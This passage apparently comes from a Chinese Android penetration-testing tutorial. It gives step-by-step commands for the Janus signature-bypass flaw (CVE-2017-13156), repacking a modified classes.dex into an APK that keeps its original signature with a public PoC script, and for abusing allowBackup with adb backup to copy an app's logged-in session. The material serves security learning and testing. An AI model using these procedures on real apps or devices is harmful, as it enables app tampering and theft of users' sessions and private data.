**0x03 Janus漏洞利用**

![](../Images/559b39536e579ac3257232a101a1d1cf.png)

1.首先查看是否使用了V2，如果使用了V2则表示漏洞不存在

https://github.com/bihe0832/Android-GetAPKInfo

命令：

java -jar GetApkInfo.jar test.apk

![](../Images/d67fa3fa8b96de4466b51ba89b106397.png)

2.然后使用baksmali.jar来将classes.dex解开  

将apk变为rar才可将classes.dex拿出来

![](../Images/10073c0a83fc25a4c29047ca18d152fd.png)

  

![](../Images/79615b56a1a125e38703ef8118c38390.png)

拿出来

![](../Images/3d8241148e2dbf22d16c34d432e317d4.png)

将这个文件拿到F:\\janus\\Apktool\\Bin下

![](../Images/078e9737cf0dda26d9c655f0c3222941.png)

将包解开

命令：

java -jar F:\\janus\\Apktool\\Bin\\baksmali.jar -o F:\\janus\\target classes.dex

![](../Images/c3580adec72d41fedf81314ca6a7c4e3.png)

在F:\\janus\\target classes.dex下会将所有的包给解开

![](../Images/9bd6ec9e27bea3a2f969ecc768bc67a2.png)

3.随意修改一个包中的参数

修改，注意修改的参数，一般改字符串，不然容易使app崩溃

![](../Images/a55b61c7bffb1e9dd128c6b70360b55b.png)

![](../Images/58da1f7f345fb70cf9c5b3af272ca0ff.png)

4.将解开的包再打包回去

进入BIN文件中

![](../Images/f858daceb2610e221f99c2137574ea60.png)

输入命令

java -jar F:\\janus\\Apktool\\Bin\\smali.jar F:\\janus\\target -o F:\\janus\\classes.dex

![](../Images/12beadb12248ff9ce13f54cc98664bfd.png)

成功之后，会在F:\\janus文件夹下生成新的classes.dex

![](../Images/bf055f3805f47b9f01b09a3303483dca.png)

5.重新签名，打包回去，生成新的apk

工具地址（https://github.com/V-E-O/PoC/blob/master/CVE-2017-13156/janus.py）

命令:python janus.py classes.dex test.apk tarfet.apk

将classes.dex和test.apk重新生成一个签名不变的tarfet.apk

![](../Images/030e790e4970b35a8e1c2870df2f4a61.png)

6.最后安装进手机,使用360手机助手

![](../Images/812366ca05b24d257e19cf5d6d7d19a7.png)

![](../Images/9572587933a428b3294eba44e7f0c987.png)

7.查看是否可以安装并且运行

思考：发现有很多打包之后运行就会失败，是因为直接把包给放进去了，多了一个资源文件，会崩溃

tarfet.apk的大小=classer.dex+bubei.apk

**0x05数据备份**

当在AndroidManifest.xml文件中未设置android:allowBackup属性值或,设置android:allowBackup="true"时,可对应用程序私有目录下的所有数据进行备份.

1.使用改之理反编译apk

搜索allowBackup\=”true”，为true说明是可以备份的

![](../Images/63750b5410c58a7d7e9d75428b90ea36.png)

2.在夜神模拟器中下载xxx，并且登录

![](../Images/ab24e3c52505cc3052421a539ffbc385.png)

  

3.在夜神模拟器打开adb shell

这个备份有手机版本限制，所以我是在夜神模拟器上去做的测试

![](../Images/ad114d04f89a45a8f9415c03b1dd54eb.png)

然后启动xxx，adb shell命令查看包名：

**adb shell dumpsys activity top #**

![](../Images/abce5d63002295415e7da1906f3c31c7.png)

找到该app的路径

**adb shell pm path com.world.three**

导出apk文件，到当前目录下。

** adb pull /data/app/com.world.three-1.apk**

 

开始备份

**adb backup -nosystem -all -noapk -noshared -f app\_live.ab com.world.three**

![](../Images/ef96583746979b29374a78749935dcc9.png)

这个需要在模拟器上去点击确认备份

![](../Images/d3258aa9c602502adac9820e71d8d366.png)

再看XXX就发现已经是登录状态了

危害：现在日益增多的充电宝上如果有这个备份程序，是否会导致一些危害
